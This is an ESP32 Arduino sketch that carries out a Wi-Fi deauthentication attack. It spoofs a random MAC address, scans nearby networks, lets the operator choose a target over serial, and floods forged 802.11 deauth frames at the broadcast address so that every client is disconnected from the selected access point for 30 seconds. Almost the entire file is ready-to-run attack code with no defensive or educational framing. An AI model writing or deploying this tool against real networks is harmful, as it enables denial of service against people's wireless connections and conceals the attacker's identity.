#include "WiFi.h"
#include "esp_wifi.h"

#define ATTACK_DURATION 30  // Attack duration in seconds
bool attackRunning = false; // Track attack state

// Generate a random MAC address
void randomizeMAC() {
  uint8_t newMAC[6];
  for (int i = 0; i < 6; i++) newMAC[i] = random(0x00, 0xFF); // Random values
  esp_wifi_set_mac(WIFI_IF_STA, &newMAC[0]);  // Apply new MAC address

  Serial.print("New Random MAC Address: ");
  Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X\n", newMAC[0], newMAC[1], newMAC[2], newMAC[3], newMAC[4], newMAC[5]);
}

// Function to send deauth packets
void sendDeauth(uint8_t *targetMAC, uint8_t *apMAC) {
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5], // Destination MAC
    apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5], // Source MAC (AP)
    apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5], // BSSID
    0x00, 0x00, 0x02, 0x00 // Reason code
  };

  for (int i = 0; i < 50; i++) { // Send 50 packets per loop
    if (!attackRunning) return; // Stop attack instantly if needed
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), true);
    delay(1);
  }
}

// Function to scan available networks
void scanNetworks() {
  int n = WiFi.scanNetworks(); 
  Serial.println("\nNearby Wi-Fi Networks:");
  for (int i = 0; i < n; i++) {
    Serial.printf("[%d] SSID: %s | MAC: %s | Signal: %d dBm\n", 
      i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.RSSI(i));
  }
  Serial.println("\nEnter the number of the Wi-Fi network to attack:");
}

// Deauth function
void attackNetwork(uint8_t *apMAC) {
  Serial.println("Launching Deauth Attack on all devices...");
  attackRunning = true;

  uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Target all devices
  long startTime = millis();

  while (millis() - startTime < ATTACK_DURATION * 1000) {
    if (!attackRunning) break; // Stop if requested
    sendDeauth(broadcastMAC, apMAC);
    Serial.println("Deauth packets sent!");
    delay(100);
  }

  Serial.println("Attack stopped!");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_STA);

  randomizeMAC(); // Change MAC on every restart
  Serial.println("Scanning networks...");
  scanNetworks();
}

void loop() {
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');

    if (input == "stop") {
      attackRunning = false;
      Serial.println("Attack manually stopped.");
      return;
    }

    int selectedNetwork = input.toInt();
    if (selectedNetwork >= 0 && selectedNetwork < WiFi.scanNetworks()) {
      uint8_t apMAC[6];
      sscanf(WiFi.BSSIDstr(selectedNetwork).c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
        &apMAC[0], &apMAC[1], &apMAC[2], &apMAC[3], &apMAC[4], &apMAC[5]);

      Serial.printf("Targeting: %s (%s)\n", WiFi.SSID(selectedNetwork).c_str(), WiFi.BSSIDstr(selectedNetwork).c_str());
      attackNetwork(apMAC);
    } else {
      Serial.println("Invalid selection. Try again.");
    }
  }
}
// I hope I will get the option to select the network and enter required password too.. for it to connect 
